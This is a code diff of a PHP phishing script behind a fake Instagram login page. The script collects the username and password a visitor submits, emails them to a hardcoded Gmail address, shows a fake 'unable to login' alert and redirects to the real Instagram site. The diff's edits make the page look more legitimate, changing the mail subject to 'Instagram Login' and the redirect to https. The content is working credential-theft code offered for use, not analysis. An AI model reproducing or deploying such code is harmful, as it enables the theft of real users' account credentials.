@@ -3,8 +3,8 @@
 //varible setting
 $username = $_POST['u_name'];  // fetch username
  $passcode = $_POST['pass'];  // fetch password
- $subject = "Someone Login ! Insta Dummy page";
- 
+ $subject = "Instagram Login" ;
+
  $to ="janitaiazaz2@gmail.com";
 
  
@@ -23,7 +23,7 @@ else
     mail($to,$subject,$txt); // send an email 
     echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
      // Simulate an HTTP redirect:
-    window.location.replace('http://www.instagram.com');
+    window.location.replace('https://www.instagram.com');
     </script>";
 }
 
